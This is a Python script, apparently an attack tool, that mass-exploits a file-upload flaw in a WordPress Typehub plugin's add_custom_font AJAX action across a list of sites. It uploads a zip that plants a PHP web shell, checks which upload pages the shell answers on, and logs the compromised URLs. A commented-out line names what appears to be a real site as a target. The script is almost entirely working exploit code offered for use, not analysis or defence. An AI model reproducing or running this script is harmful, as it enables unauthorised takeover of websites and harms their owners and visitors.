import sys , requests, re , string , random
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)
requests.urllib3.disable_warnings()
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
# Coded By RxR HaCkEr, Skype:a.789a , Telegram:@Mjzrh
banner = '''{}
          
  _____ _____ ____        _    ____  __  ____   __
 |_   _| ____| __ )      / \  |  _ \|  \/  \ \ / /
   | | |  _| |  _ \     / _ \ | |_) | |\/| |\ V / 
   | | | |___| |_) |   / ___ \|  _ <| |  | | | |  
   |_| |_____|____/___/_/   \_\_| \_\_|  |_| |_|  
                 |_____|                          

Coded By: RxR HaCkEr Telegram:t.me/CodeRxR , Skype:a.789a    

\n'''.format(fr)
print banner


try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

	

class typehub:
	def __init__(self):
		self.headers = {'Upgrade-Insecure-Requests': '1','User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
	def ran(self, length):
		letters = string.hexdigits
		return ''.join(random.choice(letters) for i in range(length)) 
		
	def URLdomain(self, site):
		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
	
	def uploaders(self, url):

		FileName_zip = self.ran(8) 
		FileUpload = 'Up.zip'
		files = {"file": (FileName_zip + ".zip", open(FileUpload, 'rb'), 'multipart/form-data')}
		data = {"action": "add_custom_font"}
		uploader = requests.post(url + "/wp-admin/admin-ajax.php", data=data, files=files, headers=self.headers, timeout=25)
		return(url + "/wp-content/uploads/typehub/custom/" + FileName_zip + "/.RxR.php?cmd=up")


			
	def Checker(self, url):
		try:
			url = "http://" + self.URLdomain(url)

			self.Path = self.uploaders(url)

			checkShell = requests.get(self.Path, headers=self.headers, timeout=25).content
			if 'UPload' in checkShell and 'multipart/form-data' in checkShell:
				print('Target:{} {}[Succefully]').format(self.Path, fg)
				open('Succefully.txt', 'a').write(self.Path +'\n')
			else:
				print('Target:{} {}[Not Vulnerable]').format(url, fr)
		except:
			print('Target:{} {} Domain[NotWork] \n{}').format(url, fr)
			


Typehub = typehub()
def Attack(url):
	try:
		
		Typehub.Checker(url)
	except:
		pass
		
#Attack("everthineevents.ca")
mp = Pool(60)
mp.map(Attack, target)
mp.close()
mp.join()
